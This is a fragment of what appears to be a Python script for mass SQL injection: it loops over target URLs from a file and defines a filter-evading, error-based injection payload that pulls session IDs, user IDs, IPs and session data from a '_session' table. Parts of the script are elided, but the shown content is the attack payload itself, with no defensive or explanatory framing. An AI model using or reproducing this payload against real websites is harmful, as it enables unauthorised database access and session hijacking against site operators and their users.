...
with open ('url.txt') as f:
        for i in f.readlines():
                ...
                sqli_password1 = 'e*xp(~(se*lect%*2afro*m(sel*ect co*ncat(0x6c75616e24,sessionid,0x3a,userid,0x3a,ip,0x3a,lastvisit,0x3a,data,0x3a,m,0x3a,c,0x3a,a,0x6c75616e24) fr*om '
                sqli_password2 = '_session li*mit 0,1)x))'
